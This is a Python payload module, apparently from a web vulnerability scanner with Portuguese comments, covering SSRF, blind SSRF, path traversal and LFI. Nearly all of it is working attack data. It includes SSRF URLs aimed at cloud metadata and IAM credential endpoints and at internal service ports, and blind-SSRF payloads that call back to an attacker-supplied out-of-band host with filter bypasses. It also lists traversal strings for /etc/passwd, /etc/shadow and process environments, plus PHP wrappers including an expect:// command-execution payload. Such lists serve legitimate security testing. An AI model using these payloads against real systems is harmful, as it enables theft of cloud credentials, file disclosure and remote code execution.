"""
payloads.py — Payloads para ServerSide_SSRF.
SSRF, blind SSRF, Path Traversal e LFI.
"""

# ── SSRF ──────────────────────────────────────────────────────────────────────

# Parâmetros tipicamente vulneráveis a SSRF
SSRF_PARAMS = [
    "url", "uri", "src", "source", "href", "link", "host", "target",
    "dest", "destination", "redirect", "redirect_url", "proxy", "callback",
    "fetch", "load", "page", "site", "file", "document", "request",
    "data", "resource", "endpoint", "api_url", "webhook", "return",
    "next", "service", "image_url", "img", "logo", "path",
]

# Alvos SSRF — metadata clouds + loopback
SSRF_TARGETS = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/user-data",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/instance/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Kubernetes
    "http://kubernetes.default.svc/api/v1/namespaces",
    # Loopback / internal
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    # Internal services (common)
    "http://127.0.0.1:6379/",        # Redis
    "http://127.0.0.1:27017/",       # MongoDB
    "http://127.0.0.1:9200/",        # Elasticsearch
    "http://127.0.0.1:8500/",        # Consul
    "http://127.0.0.1:4040/",        # ngrok admin
]

# Indicadores de SSRF bem-sucedido
SSRF_MARKERS = [
    "ami-id", "instance-id", "placement", "security-credentials",
    "iam", "169.254", "metadata", "computeMetadata",
    "subscriptionid", "azure",
    "redis_version", "elasticsearch",
    "namespaces", "kubernetes",
    "<!doctype", "<html",     # loopback retornou HTML
]

# ── Blind SSRF ────────────────────────────────────────────────────────────────

# OOB endpoint configurável — por padrão desativado
# O usuário pode passar --oob-host para ativar
BLIND_SSRF_INDICATOR = "buggy-ssrf-probe"


def blind_ssrf_payloads(oob_host: str) -> list[str]:
    """Gera payloads para SSRF cego com callback no oob_host."""
    return [
        f"http://{oob_host}/ssrf-probe",
        f"https://{oob_host}/ssrf-probe",
        f"http://{oob_host}:80/ssrf-probe",
        f"//{oob_host}/ssrf-probe",
        f"http://{oob_host}%23@example.com/",   # bypass via fragment
        f"http://example.com@{oob_host}/",       # bypass via auth
    ]


# ── Path Traversal ────────────────────────────────────────────────────────────

PATH_PARAMS = [
    "file", "path", "page", "include", "document", "doc",
    "load", "read", "view", "template", "layout", "conf",
    "config", "resource", "filename", "filepath", "dir",
    "folder", "name", "src", "dest",
]

PATH_PAYLOADS = [
    # Unix
    "../../../../../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../etc/passwd",
    "/../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",  # double encode
    "/%5C../%5C../etc/passwd",
    # Windows
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
    # Null byte (PHP < 5.3)
    "../../etc/passwd\x00",
    "../../etc/passwd%00",
    # Other sensitive files
    "../../etc/shadow",
    "../../etc/hostname",
    "../../proc/self/environ",
    "../../proc/version",
    "../../var/log/apache2/access.log",
    "../../var/log/nginx/access.log",
]

TRAVERSAL_MARKERS = [
    "root:x:0:0",
    "root:x:",
    "bin:x:",
    "/bin/bash",
    "/bin/sh",
    "daemon:",
    "[drivers]",
    "localhost",
    "linux version",
    "HTTP_",        # /proc/self/environ
]

# ── LFI ───────────────────────────────────────────────────────────────────────

LFI_PAYLOADS = [
    # Diretos
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/version",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "data://text/plain,<?php phpinfo(); ?>",
    # Expect wrapper (RCE se habilitado)
    "expect://id",
    # Phar (gadget chains)
    "phar://./uploads/test.jpg/test",
]

LFI_MARKERS = TRAVERSAL_MARKERS + [
    "<?php",
    "phpinfo",
    "uid=",
    "PD9waHA",   # base64 de "<?ph"
]
